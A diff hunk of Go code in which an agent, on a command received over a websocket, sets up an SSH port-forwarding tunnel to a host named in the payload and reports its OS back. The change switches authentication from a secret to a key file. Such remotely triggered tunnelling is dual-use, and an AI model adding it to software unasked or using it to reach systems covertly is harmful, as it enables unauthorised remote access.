@@ -203,7 +203,7 @@ func (a *Agent) handleRs(payload *Payload) {
 	shell := args[0]
 	params := args[1:payload.length]
 	intport := strconv.Itoa(9600 + rand.Intn(100))
-	command := "-NL " + intport + ":" + params[1] + ":" + params[2] + " " + params[3] + "@" + params[4] + " -p " + a.secret
+	command := "-NL " + intport + ":" + params[1] + ":" + params[2] + " " + params[3] + "@" + params[4] + " -i ./key.pem"
 	fmt.Println(shell, params)
 	connectToRs(command, shell, intport)
 	send("/msg: "+runtime.GOOS+" -> "+payload.from, a.ws)
